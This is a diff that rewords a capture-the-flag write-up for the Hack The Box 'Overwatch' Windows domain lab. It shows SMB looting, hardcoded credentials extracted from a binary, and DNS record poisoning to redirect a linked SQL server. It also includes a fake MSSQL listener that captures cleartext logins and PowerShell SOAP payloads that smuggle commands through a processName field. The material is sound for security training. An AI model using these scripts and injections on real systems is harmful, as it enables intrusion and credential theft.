@@ -8,7 +8,9 @@ image:
     path: assets/img/htb/overwatch/banner.png
 ---
 
-## 1. Initial Recon
+## Recon
+
+Let's scan the target first.
 
 ```bash
 nmap -sC -sV -Pn -T4 10.129.2.75
@@ -26,7 +28,8 @@ PORT     STATE SERVICE       VERSION
 DNS_Computer_Name: S200401.overwatch.htb
 ```
 
-### Full port sweep
+The default scan misses some ports, so I scanned all of them and checked the new ones:
+
 ```bash
 nmap -p- -Pn -T4 10.129.2.75
 nmap -sC -sV -Pn -p 6520,9389,49664,49668,52495,52510,55655,58993,58994 10.129.2.75
@@ -34,9 +37,9 @@ nmap -sC -sV -Pn -p 6520,9389,49664,49668,52495,52510,55655,58993,58994 10.129.2
 6520/tcp  open  ms-sql-s   Microsoft SQL Server 2022 16.00.1000.00
 ```
 
----
+## SMB
 
-## 2. SMB Enumeration
+The `software$` share is open to anonymous users, so let's look inside.
 
 ```bash
 smbclient -N -L //10.129.2.75
@@ -52,9 +55,7 @@ software$       Disk
   overwatch.pdb
 ```
 
----
-
-## 3. Loot Binary + Extract Hardcoded SQL Credentials
+There is a monitoring app in the share. I downloaded it and looked at the strings, and it has hardcoded SQL credentials:
 
 ```bash
 mkdir -p ~/Downloads/htb_overwatch
@@ -65,12 +66,9 @@ strings -el overwatch.exe | head -n 300
 Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
 ```
 
-Recovered credential:
-- `overwatch.htb\sqlsvc : TI0LKcfHzZw1Vv`
+The credential is `overwatch.htb\sqlsvc : TI0LKcfHzZw1Vv`.
 
----
-
-## 4. Validate `sqlsvc` and Enumerate Access
+Let's see where `sqlsvc` works:
 
 ```bash
 nxc smb 10.129.2.75 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv'
@@ -84,17 +82,18 @@ RDP  [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
 WINRM [-] ...
 ```
 
-`sqlsvc` is valid domain creds but no WinRM shell.
+`sqlsvc` is a valid domain account, but we can't get a WinRM shell with it.
 
----
+## SQL linked server
 
-## 5. SQL Access as `sqlsvc` + Linked Server Discovery
+So we log in to MSSQL with it:
 
 ```bash
 impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.2.75 -windows-auth -port 6520
 ```
 
-Inside SQL shell:
+Inside the SQL shell:
+
 ```sql
 SELECT SYSTEM_USER;
 SELECT IS_SRVROLEMEMBER('sysadmin');
@@ -107,11 +106,11 @@ Linked Server:
 - SQL07
 ```
 
-`SQL07` becomes the pivot point.
+`SQL07` is the one we will go after.
 
----
+## DNS record
 
-## 6. Confirm AD DNS Write Primitive
+With `bloodyAD` we can check what `sqlsvc` can write in AD:
 
 ```bash
 ~/.local/bin/bloodyAD -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' -H 10.129.2.75 get writable
@@ -120,20 +119,18 @@ distinguishedName: DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwat
 permission: CREATE_CHILD
 ```
 
-Add malicious DNS record for linked server host:
+So we can add a DNS record that points `SQL07` to our machine:
+
 ```bash
 ~/.local/bin/bloodyAD -d overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' -H 10.129.2.75 add dnsRecord SQL07 10.10.14.87
 
 [+] SQL07 has been successfully added
 ```
 
----
+## Capture the linked server login
 
-## 7. Capture Linked SQL Credentials
+`Responder` needed root here, so I wrote a small fake MSSQL listener that reads the cleartext login. This is `responder_like_mssql.py`:
 
-Because `Responder` required root in this environment, a minimal standalone MSSQL listener was used to emulate prelogin and parse cleartext login.
-
-### PoC Script: `responder_like_mssql.py`
 ```python
 #!/usr/bin/env python3
 import socket,struct
@@ -181,12 +178,14 @@ while True:
     c.close()
 ```
 
-### Run listener
+Run the listener:
+
 ```bash
 python3 responder_like_mssql.py
 ```
 
-### Trigger linked server auth from SQL shell
+Then make the linked server connect to us from the SQL shell:
+
 ```sql
 SELECT * FROM OPENQUERY(SQL07,'SELECT SYSTEM_USER');
 
@@ -196,12 +195,11 @@ SELECT * FROM OPENQUERY(SQL07,'SELECT SYSTEM_USER');
 [+] cleartext user=sqlmgmt pass=bIhBbzMMnB82yx server=SQL07 db=
 ```
 
-Recovered credential:
-- `overwatch.htb\sqlmgmt : bIhBbzMMnB82yx`
+The credential is `overwatch.htb\sqlmgmt : bIhBbzMMnB82yx`.
 
----
+## User flag
 
-## 8. WinRM Shell Capability with `sqlmgmt`
+This account can get a WinRM shell:
 
 ```bash
 nxc smb 10.129.2.75 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
@@ -211,33 +209,28 @@ SMB   [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx
 WINRM [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
 ```
 
----
-
-## 9. Retrieve `user.txt`
+Now we can read the user flag:
 
 ```bash
 nxc winrm 10.129.2.75 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx' -x "type C:\\Users\\sqlmgmt\\Desktop\\user.txt"
 ```
 
----
+## Root
 
-## 10. Privilege Escalation to Retrieve `root.txt`
+From the WinRM shell (`evil-winrm`) we can look at the local monitoring service API:
 
-### 10.1 Enumerate local vulnerable monitoring service API
-
-From WinRM (`evil-winrm`):
 ```powershell
 iwr -UseBasicParsing http://localhost:8000/MonitorService?wsdl | select -ExpandProperty Content
 iwr -UseBasicParsing http://localhost:8000/MonitorService?xsd=xsd0 | select -ExpandProperty Content
 ```
 
-### Evidence
-WSDL exposed methods:
+The WSDL shows these methods:
 - `StartMonitoring`
 - `StopMonitoring`
 - `KillProcess`
 
-XSD showed:
+The XSD shows:
+
 ```xml
 <xs:element name="KillProcess">
   <xs:complexType>
@@ -248,16 +241,14 @@ XSD showed:
 </xs:element>
 ```
 
-`overwatch.exe` logic previously indicated PowerShell command construction:
+From `overwatch.exe`, the service builds this PowerShell command:
+
 - `Stop-Process -Name <processName> -Force`
 
-This is command injection via `processName`.
+`processName` goes straight into the command, so we can inject our own command through it.
 
----
+First a test to see who runs our command. This is `killprocess_inject.ps1`:
 
-### 10.2 PoC Execution Context Test
-
-#### Script: `killprocess_inject.ps1`
 ```powershell
 $payload='abc;whoami | Out-File C:\Windows\Temp\poc.txt;#'
 $xml = "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'><s:Body><KillProcess xmlns='http://tempuri.org/'><processName>$payload</processName></KillProcess></s:Body></s:Envelope>"
@@ -277,27 +268,26 @@ if (Test-Path C:\Windows\Temp\poc.txt) {
 }
 ```
 
-#### Upload and run
+Upload and run it:
+
 ```text
 evil-winrm -i 10.129.2.75 -u sqlmgmt -p 'bIhBbzMMnB82yx'
 upload killprocess_inject.ps1
 powershell -ep bypass -File C:\Users\sqlmgmt\Documents\killprocess_inject.ps1
 ```
 
-### Evidence
+This is what came back:
+
 ```text
 STATUS=200
 ...
 Test-Path : Access is denied
 ```
 
-The access-denied side effect against `C:\Windows\Temp\poc.txt` from low-priv `sqlmgmt` while SOAP returns success indicates privileged execution context.
+The SOAP request returns success, but `sqlmgmt` gets access denied on `C:\Windows\Temp\poc.txt`. So our command ran as a more privileged user.
 
----
+Now we use the same injection to copy the root flag. This is `killprocess_root.ps1`:
 
-### 10.3 Read `root.txt` via Injection
-
-#### Script: `killprocess_root.ps1`
 ```powershell
 $payload='abc;Get-Content C:\Users\Administrator\Desktop\root.txt | Out-File C:\Users\sqlmgmt\Documents\root.txt;#'
 $xml = "<s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'><s:Body><KillProcess xmlns='http://tempuri.org/'><processName>$payload</processName></KillProcess></s:Body></s:Envelope>"
@@ -316,7 +306,8 @@ if (Test-Path C:\Users\sqlmgmt\Documents\root.txt) {
 }
 ```
 
-#### Upload and execute
+Upload and run it:
+
 ```text
 evil-winrm -i 10.129.2.75 -u sqlmgmt -p 'bIhBbzMMnB82yx'
 upload killprocess_root.ps1
